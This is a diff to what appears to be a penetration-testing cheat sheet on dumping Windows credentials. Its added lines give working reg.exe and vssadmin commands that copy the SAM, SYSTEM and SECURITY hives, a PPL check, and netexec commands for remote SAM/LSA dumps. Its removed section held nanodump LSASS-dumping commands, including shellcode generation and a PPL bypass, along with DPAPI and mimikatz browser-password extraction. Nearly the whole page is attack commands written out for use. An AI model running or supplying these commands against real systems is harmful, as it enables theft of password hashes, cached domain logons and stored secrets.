@@ -4,6 +4,8 @@ title: "SAM & LSA secrets"
 
 # 🔓 SAM & LSA secrets
 
+> _Local credential material stored in registry hives: local account hashes (SAM), domain cached logons (DCC2), service account passwords and DPAPI machine key (LSA secrets)._
+
 | Hive            | Content                                                   |
 | --------------- | --------------------------------------------------------- |
 | `HKLM\SAM`      | Password hashes for local user accounts                   |
@@ -15,25 +17,27 @@ title: "SAM & LSA secrets"
 ### reg.exe (live system)
 
 ```cmd
-reg.exe save hklm\sam C:\sam
-reg.exe save hklm\system C:\system
-reg.exe save hklm\security C:\security
+reg.exe save hklm\sam C:\Windows\Temp\sam                         # requires SYSTEM (or SeBackupPrivilege)
+reg.exe save hklm\system C:\Windows\Temp\system
+reg.exe save hklm\security C:\Windows\Temp\security
 ```
 
 ### vssadmin (shadow copy - more stealth)
 
 ```cmd
-vssadmin create shadow /for=C:
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SAM C:\sam
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SYSTEM C:\system
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SECURITY C:\security
+vssadmin create shadow /for=C:                                    # replace X below with the shadow copy number returned
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SAM C:\Windows\Temp\sam
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SYSTEM C:\Windows\Temp\system
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SECURITY C:\Windows\Temp\security
 ```
 
-### Check if PPL is enabled (blocks SECURITY reading)
+### Check PPL (needed for live mimikatz lsadump)
 
 ```powershell
 Get-Process lsass | Select-Object ProcessName, @{Name='Protected';Expression={$_.ProtectedProcess}}
 ```
+
+> _PPL blocks mimikatz's live `lsadump::secrets` (which talks to LSASS); `reg save` / `vssadmin` work regardless._
 
 ## Extract credentials
 
@@ -53,47 +57,14 @@ mimikatz # lsadump::cache
 ```
 
 ```bash [nxc]
-# Remote dumping
-netexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD --sam/--lsa
+# Remote dump (requires admin on the target)
+nxc smb $TARGET -d $DOMAIN -u $USER -p $PASSWORD --sam
+nxc smb $TARGET -d $DOMAIN -u $USER -p $PASSWORD --lsa
 
-# Local User Authentication
-nxc smb $TARGET -d $DOMAIN --local-auth -u $USER -p $PASSWORD --sam/--lsa
+# Local account auth (non domain-joined)
+nxc smb $TARGET --local-auth -u $USER -p $PASSWORD --sam
 ```
 
 :::
 
-## DPAPI extraction
-
-::: code-group
-
-```bash [donpapi]
-# Remote
-donpapi dump --target $TARGET --username $DOMAIN\\$USER --password $PASSWORD
-
-# Local
-donpapi dump --local
-
-# LSA secrets only
-donpapi lsa --target 192.168.1.10 -u CORP\\jsmith -p P@ssw0rd
-```
-
-```bash [nanodump]
-# Generate shellcode
-donut -f nanodump.x64.exe -o payload.bin -a 2
-
-# Or use the loader directly (if you have execution)
-nanodump.x64.exe --write C:\temp\lsass.dmp
-
-# With PPL bypass (requires driver)
-nanodump.x64.exe --ppl --write lsass.dmp
-```
-
-```bash [impacket (dpapi.py)]
-dpapi.py masterkey -file /path/to/key
-```
-
-```bash [mimikatz]
-mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
-```
-
-:::
+> _For DPAPI blobs (Credential Manager, browsers, vaults), see the dedicated [DPAPI cheatsheet](./dpapi.md)._
